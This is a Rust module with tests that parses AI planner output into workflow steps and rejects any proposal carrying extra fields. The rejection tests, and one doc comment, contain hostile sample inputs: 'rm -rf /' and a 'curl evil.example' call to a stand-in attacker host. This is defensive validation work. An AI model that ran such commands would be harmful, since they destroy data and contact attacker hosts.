//! What a Planner is allowed to produce — §29, §40.
//!
//! §29 is blunt about this: a Planner may emit steps, and may not run a shell, write a file,
//! call an API or send a notification. A *declarative* workflow gets that for free, because a
//! human wrote the YAML and a reviewer read it. A **dynamic** sub-plan does not: something
//! reasoning at runtime produced it, and it arrives as text.
//!
//! So the boundary is this type. A proposal is JSON that either deserialises into steps or is
//! rejected, and `deny_unknown_fields` is the load-bearing part: a proposal carrying
//! `"command": "rm -rf /"` alongside its steps does not parse. Ignoring the extra key would
//! have been the friendlier default and would have made §29 unenforceable, because a proposal
//! could then always be *read* as legitimate no matter what else it asked for.
//!
//! ```
//! use pearl_planner::PlanProposal;
//!
//! let proposal: PlanProposal = serde_json::from_str(r#"{
//!   "steps": [
//!     { "id": "collect", "capability": "script.collect" },
//!     { "id": "check", "capability": "verifier.task-result",
//!       "kind": "verify", "depends_on": ["collect"],
//!       "input_from": { "result": "steps.collect.output" } }
//!   ]
//! }"#).unwrap();
//!
//! assert_eq!(proposal.steps.len(), 2);
//! // A verify step declares what it verifies, which is what the compiler checks against.
//! assert!(proposal.verify_targets().contains("collect"));
//! ```

use std::collections::{BTreeMap, HashSet};
use std::time::Duration;

use pearl_core::PrecisionClass;
use serde::{Deserialize, Serialize};

use crate::planner::{PlanStep, StepRef, StepRole};

/// What a step in a proposal is for.
///
/// The same vocabulary a declarative workflow uses, so that a plan produced at runtime is
/// reviewable against the same rules as one written by hand.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProposedKind {
    /// Ordinary work.
    #[default]
    Run,
    /// Verification of the steps it depends on — the only kind that can discharge an
    /// exactness demand (Article 8).
    Verify,
    /// Work with a side effect.
    Effect,
    /// A step that will itself propose a plan.
    Plan,
}

impl ProposedKind {
    /// The precision class this kind implies.
    ///
    /// An effect is P2 because it touches the world; a planning step is P1 because it is
    /// reasoning, which also makes it count against the plan's LLM budget.
    pub fn precision_class(self) -> PrecisionClass {
        match self {
            Self::Run | Self::Verify => PrecisionClass::P0,
            Self::Plan => PrecisionClass::P1,
            Self::Effect => PrecisionClass::P2,
        }
    }

    /// The executor role this kind implies.
    pub fn role(self) -> StepRole {
        match self {
            Self::Plan => StepRole::Plan,
            _ => StepRole::Execute,
        }
    }
}

fn default_timeout_secs() -> u64 {
    60
}

/// One step of a proposed plan.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProposedStep {
    /// Unique within the proposal.
    pub id: String,
    /// The capability to invoke. Checked against the registry by the compiler, not here.
    pub capability: String,
    /// What the step is for.
    #[serde(default)]
    pub kind: ProposedKind,
    /// Steps within this proposal that must finish first.
    #[serde(default)]
    pub depends_on: Vec<String>,
    /// How long the step may take.
    #[serde(default = "default_timeout_secs")]
    pub timeout_secs: u64,
    /// Whether the step's result must be exact, and so must be verified.
    #[serde(default)]
    pub exactness_required: bool,
    /// Constants the step is configured with.
    #[serde(default)]
    pub input: BTreeMap<String, serde_json::Value>,
    /// Payload keys wired to another step's output.
    #[serde(default)]
    pub input_from: BTreeMap<String, StepRef>,
}

impl ProposedStep {
    /// A minimal proposed step.
    pub fn new(id: impl Into<String>, capability: impl Into<String>) -> Self {
        Self {
            id: id.into(),
            capability: capability.into(),
            kind: ProposedKind::Run,
            depends_on: Vec::new(),
            timeout_secs: default_timeout_secs(),
            exactness_required: false,
            input: BTreeMap::new(),
            input_from: BTreeMap::new(),
        }
    }

    /// Sets the kind.
    pub fn of_kind(mut self, kind: ProposedKind) -> Self {
        self.kind = kind;
        self
    }

    /// Declares dependencies.
    pub fn after(mut self, deps: impl IntoIterator<Item = impl Into<String>>) -> Self {
        self.depends_on = deps.into_iter().map(Into::into).collect();
        self
    }

    /// Wires a payload key to another step's output.
    pub fn taking(mut self, key: impl Into<String>, reference: StepRef) -> Self {
        self.input_from.insert(key.into(), reference);
        self
    }

    /// Converts to the plan step the executor runs.
    pub fn to_plan_step(&self) -> PlanStep {
        PlanStep {
            id: self.id.clone(),
            capability: self.capability.clone(),
            depends_on: self.depends_on.clone(),
            precision_class: self.kind.precision_class(),
            timeout: Duration::from_secs(self.timeout_secs),
            exactness_required: self.exactness_required,
            input: self.input.clone(),
            input_from: self.input_from.clone(),
            role: self.kind.role(),
        }
    }
}

/// A plan produced at runtime rather than written by hand — §40's dynamic form.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PlanProposal {
    /// The steps to run.
    pub steps: Vec<ProposedStep>,
}

impl PlanProposal {
    /// A proposal of the given steps.
    pub fn of(steps: impl IntoIterator<Item = ProposedStep>) -> Self {
        Self {
            steps: steps.into_iter().collect(),
        }
    }

    /// The steps to hand to the Planner.
    pub fn to_plan_steps(&self) -> Vec<PlanStep> {
        self.steps.iter().map(ProposedStep::to_plan_step).collect()
    }

    /// The steps some `verify` step in this proposal depends on.
    ///
    /// Only `verify` steps count. Taking any dependency as verification would let a proposal
    /// discharge its own exactness demand by putting one ordinary step after another.
    pub fn verify_targets(&self) -> HashSet<String> {
        self.steps
            .iter()
            .filter(|s| s.kind == ProposedKind::Verify)
            .flat_map(|s| s.depends_on.clone())
            .collect()
    }

    /// The ids this proposal defines.
    pub fn step_ids(&self) -> HashSet<&str> {
        self.steps.iter().map(|s| s.id.as_str()).collect()
    }

    /// Whether any step would itself propose a further plan.
    pub fn requests_further_planning(&self) -> bool {
        self.steps.iter().any(|s| s.kind == ProposedKind::Plan)
    }

    /// Reads a proposal from what a planning step printed.
    ///
    /// A bare array is accepted as well as `{"steps": […]}`: the shape §29 shows is a list of
    /// steps, and a planner that prints exactly that is not wrong. Anything else is refused
    /// with what it looked like, because "the planner produced no plan" and "the planner
    /// produced an unusable plan" are the same problem to the run and different to whoever
    /// has to fix it.
    pub fn from_value(value: &serde_json::Value) -> Result<Self, ProposalError> {
        let attempt = if value.is_array() {
            serde_json::from_value::<Vec<ProposedStep>>(value.clone()).map(Self::of)
        } else {
            serde_json::from_value::<Self>(value.clone())
        };
        let proposal = attempt.map_err(|e| ProposalError::Malformed {
            detail: e.to_string(),
        })?;
        if proposal.steps.is_empty() {
            return Err(ProposalError::Empty);
        }
        let mut seen = HashSet::new();
        for step in &proposal.steps {
            if step.id.is_empty() {
                return Err(ProposalError::Malformed {
                    detail: "a step has an empty id".to_string(),
                });
            }
            if !seen.insert(step.id.as_str()) {
                return Err(ProposalError::DuplicateStepId {
                    id: step.id.clone(),
                });
            }
        }
        Ok(proposal)
    }
}

/// Why a proposal could not be read as a plan.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum ProposalError {
    /// It did not have the shape of a plan.
    #[error("the proposal is not a plan: {detail}")]
    Malformed { detail: String },
    /// It parsed but proposed nothing.
    ///
    /// Refused rather than treated as "nothing to do": a planning step that was asked for a
    /// plan and returned none has failed, and continuing would report a run as successful
    /// having skipped the work the plan was for.
    #[error("the proposal contains no steps")]
    Empty,
    /// Two steps share an id.
    #[error("the proposal defines step '{id}' twice")]
    DuplicateStepId { id: String },
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_shape_from_the_specification_parses() {
        // §29's own example, verbatim in JSON.
        let value = serde_json::json!({
            "steps": [
                { "id": "collect", "capability": "script.news.collect" },
                { "id": "summarize", "capability": "agent.summarize", "depends_on": ["collect"] },
                { "id": "verify", "capability": "verifier.digest", "kind": "verify",
                  "depends_on": ["summarize"] }
            ]
        });
        let proposal = PlanProposal::from_value(&value).unwrap();
        assert_eq!(proposal.steps.len(), 3);
        assert_eq!(proposal.steps[1].depends_on, vec!["collect"]);
        assert!(proposal.verify_targets().contains("summarize"));
    }

    #[test]
    fn a_bare_list_of_steps_is_accepted() {
        let value = serde_json::json!([{ "id": "a", "capability": "script.a" }]);
        assert_eq!(PlanProposal::from_value(&value).unwrap().steps.len(), 1);
    }

    /// §29: a Planner may not run a shell. Enforced by refusing to read a proposal that asks
    /// for anything other than steps, rather than by ignoring the parts that are not steps.
    #[test]
    fn a_proposal_asking_for_more_than_steps_is_refused() {
        for value in [
            serde_json::json!({ "steps": [], "command": "rm -rf /" }),
            serde_json::json!({
                "steps": [{ "id": "a", "capability": "script.a", "shell": "curl evil.example" }]
            }),
            serde_json::json!({ "steps": [{ "id": "a", "capability": "script.a", "env": {} }] }),
        ] {
            let err = PlanProposal::from_value(&value).unwrap_err();
            assert!(
                matches!(err, ProposalError::Malformed { .. }),
                "expected a refusal for {value}, got {err}"
            );
        }
    }

    #[test]
    fn a_proposal_of_nothing_is_a_failure_not_a_no_op() {
        let err = PlanProposal::from_value(&serde_json::json!({ "steps": [] })).unwrap_err();
        assert_eq!(err, ProposalError::Empty);
    }

    #[test]
    fn duplicate_ids_are_refused() {
        let value = serde_json::json!({
            "steps": [
                { "id": "a", "capability": "script.a" },
                { "id": "a", "capability": "script.b" }
            ]
        });
        assert!(matches!(
            PlanProposal::from_value(&value).unwrap_err(),
            ProposalError::DuplicateStepId { .. }
        ));
    }

    #[test]
    fn something_that_is_not_a_plan_at_all_is_refused() {
        for value in [
            serde_json::json!("looks good to me"),
            serde_json::json!(42),
            serde_json::json!({ "plan": "do the thing" }),
            serde_json::json!(null),
        ] {
            assert!(
                PlanProposal::from_value(&value).is_err(),
                "{value} should not read as a plan"
            );
        }
    }

    #[test]
    fn kinds_carry_their_class_and_role() {
        assert_eq!(ProposedKind::Run.precision_class(), PrecisionClass::P0);
        assert_eq!(ProposedKind::Effect.precision_class(), PrecisionClass::P2);
        // Planning is reasoning, so it counts against the LLM budget.
        assert_eq!(ProposedKind::Plan.precision_class(), PrecisionClass::P1);
        assert_eq!(ProposedKind::Plan.role(), StepRole::Plan);
        assert_eq!(ProposedKind::Verify.role(), StepRole::Execute);
    }

    #[test]
    fn a_proposed_step_becomes_a_plan_step_with_its_wiring_intact() {
        let proposed = ProposedStep::new("summarize", "agent.summarize")
            .after(["collect"])
            .taking("items", StepRef::field("collect", ["items"]));
        let step = proposed.to_plan_step();
        assert_eq!(step.id, "summarize");
        assert_eq!(step.depends_on, vec!["collect"]);
        assert_eq!(
            step.input_from["items"],
            StepRef::field("collect", ["items"])
        );
        assert_eq!(step.timeout, Duration::from_secs(60));
        assert_eq!(step.role, StepRole::Execute);
    }

    #[test]
    fn a_proposal_says_whether_it_asks_for_more_planning() {
        let flat = PlanProposal::of([ProposedStep::new("a", "script.a")]);
        assert!(!flat.requests_further_planning());
        let nested = PlanProposal::of([
            ProposedStep::new("a", "script.a"),
            ProposedStep::new("b", "agent.plan").of_kind(ProposedKind::Plan),
        ]);
        assert!(nested.requests_further_planning());
    }
}
